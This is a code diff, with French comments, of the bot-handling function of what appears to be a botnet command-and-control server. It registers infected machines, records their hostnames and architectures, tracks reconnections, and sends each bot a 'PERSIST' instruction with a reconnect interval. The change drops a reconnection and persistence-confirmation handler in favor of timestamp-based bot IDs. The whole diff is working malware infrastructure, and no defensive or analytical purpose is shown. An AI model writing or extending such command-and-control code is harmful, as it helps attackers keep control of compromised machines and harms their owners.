@@ -99,39 +99,11 @@ def handle_bot(client_socket, address):
                 if len(parts) > 1:
                     bot_data['system_info'] = parts[1].strip()
                     
-                    # Extraire le nom d'hôte et l'architecture si disponibles
-            
-            # Nouveau format d'enregistrement avec ID unique
-            elif 'REGISTER' in data:
-                parts = data.split(' ', 2)
-                if len(parts) >= 3:
-                    device_id = parts[1].strip()
-                    system_info = parts[2].strip()
-                    
+                    # Générer un ID unique basé sur l'adresse IP et le temps
+                    device_id = f"{bot_data['ip']}_{int(time.time())}"
                     bot_data['device_id'] = device_id
-                    bot_data['system_info'] = system_info
                     
-                    # Vérifier si c'est un bot qui se reconnecte
-                    if device_id in bot_info:
-                        bot_data['reconnect_count'] = bot_info[device_id]['reconnect_count'] + 1
-                        print(f"\033[92m[+] Bot {device_id} reconnecté ({bot_data['reconnect_count']} fois)\033[0m")
-                        
-                        # Si le bot s'est reconnecté plusieurs fois, marquer la persistance comme confirmée
-                        if bot_data['reconnect_count'] >= 2:
-                            bot_data['persistence_confirmed'] = True
-                            bot_persistence[device_id] = True
-                            print(f"\033[92m[+] Persistance confirmée pour {device_id}\033[0m")
-                    else:
-                        # Nouveau bot
-                        print(f"\033[92m[+] Nouveau bot enregistré: {device_id}\033[0m")
-                        
-                    # Envoyer une commande de confirmation d'enregistrement
-                    client_socket.send(f"CONFIRM {device_id}".encode('utf-8'))
-                    
-                    # Mettre à jour les informations du bot
-                    with lock:
-                        bot_info[device_id] = bot_data
-                    
+                    # Extraire le nom d'hôte et l'architecture si disponibles
                     if 'Hostname:' in bot_data['system_info']:
                         hostname_line = bot_data['system_info'].split('\n')[0]
                         bot_data['hostname'] = hostname_line.split('Hostname:')[1].strip()
@@ -145,6 +117,13 @@ def handle_bot(client_socket, address):
                         bot_data['arch'] = 'x86_64'
                     elif 'x86' in bot_data['system_info'].lower():
                         bot_data['arch'] = 'x86'
+                    
+                    # Mettre à jour les informations du bot
+                    with lock:
+                        bot_info[device_id] = bot_data
+                    
+                    # Afficher un message pour les nouveaux bots
+                    print(f"\033[92m[+] Nouveau bot connecté: {bot_data['ip']} ({bot_data['hostname']})\033[0m")
                 
                 # Envoyer les instructions de persistance
                 client_socket.send(f"PERSIST {RECONNECT_INTERVAL}".encode('utf-8'))
